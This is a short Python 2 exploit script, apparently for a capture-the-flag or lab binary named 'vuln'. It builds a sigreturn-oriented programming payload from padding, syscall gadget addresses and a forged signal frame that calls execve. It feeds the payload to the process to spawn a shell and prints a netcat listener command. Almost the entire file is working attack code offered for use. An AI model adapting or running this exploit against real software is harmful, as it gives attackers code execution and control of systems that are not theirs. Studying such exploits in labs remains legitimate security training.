#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Author: 	Blackndoor
# Website:	http://blackbunny.io/
#
# start: 	python exploit.py
#

from struct import *
from Frame import *
from subprocess import Popen, PIPE
import time
import sys

SYS_CALL     = 0x400123			# gadget syscall;ret;
SYS_EXECVE   = 59			# sys_execve syscall
SHELL        = 0x600144			# 0x600140:	"me:"			

#############################################################################
# Construction of the payload
#
# chunk before RIP: "A" * 8
#
# 3 * syscall / ret
#	1. RAX=306 => sys_syncfs => rax 0
#	2. RAX=0   => sys_read   => "C"*15 => RAX 15 => sys_rt_sigreturn
#	3. RAX=15  => sys_rt_sigreturn
#
# struct sigcontext
#	set rax to sys_execve
#	set rdi to SHELL
#	set rip to SYS_cALL
#
# chunk to have payload len 295 for 1.
#
#############################################################################
payload = "A" * 8
payload+= pack('<Q',SYS_CALL)*3
frame = SigreturnFrame(arch="x64")
frame.set_regvalue("rax", SYS_EXECVE)
frame.set_regvalue("rdi", SHELL)
frame.set_regvalue("rip", SYS_CALL)
payload+= frame.get_frame()
payload+= "B"*(295-len(payload))

#############################################################################
# open the binary
p = Popen(['./vuln'], stdin=PIPE)

# send the payload
p.stdin.write(payload)

# test shown that time is necessary
time.sleep(0.1)

# Enjoy your shell !!!
print "\n[i] run : nc -lvp 8080 in another shell !"
print "[i] when ready, enter : CCCCCCCCCCCCCC following by [enter]...."
p.wait()
print "[!] Enjoy your shell !!!"
